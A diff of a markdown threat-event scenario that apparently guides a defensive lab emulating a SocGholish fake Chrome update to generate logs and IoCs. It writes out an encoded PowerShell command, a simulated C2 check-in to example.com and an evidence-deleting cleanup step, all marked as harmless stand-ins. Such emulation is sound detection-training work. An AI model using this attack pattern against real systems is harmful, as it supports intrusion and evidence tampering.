@@ -1,13 +1,13 @@
 # Threat Event (SocGholish Fake Browser Update)
 **Unauthorized SocGholish Loader Emulation**
 
-## Steps the "Bad Actor" took Create Logs and IoCs:
-1. Visists a compromised website (simulated)
-2. Downloads a fake chrome update installer named: `chrome_update_fake.exe`
+## Steps the "Bad Actor" took to Create Logs and IoCs:
+1. Visit a compromised website (simulated)
+2. Downloads a fake Chrome update installer named: `chrome_update_fake.exe`
 3. Executes the fake installer 
 4. The "installer" then runs an obfuscated PowerShell encoded command: `powershell -enc UwBlAGMAdQByAGU=` (base64 for "secure", harmless)
 5. PowerShell sends a simulated C2 check-in to a benign site: `Invoke-WebRequest -Uri "http://example.com/collect"`
-6. Deletes the fake installer to mimic attacker cleanup: `Remove-Item C:\Users\<username>\ Downloads\chrome_update_fake.exe.exe`
+6. Deletes the fake installer to mimic attacker cleanup: `Remove-Item C:\Users\<username>\Downloads\chrome_update_fake.exe`
 
 ---
 
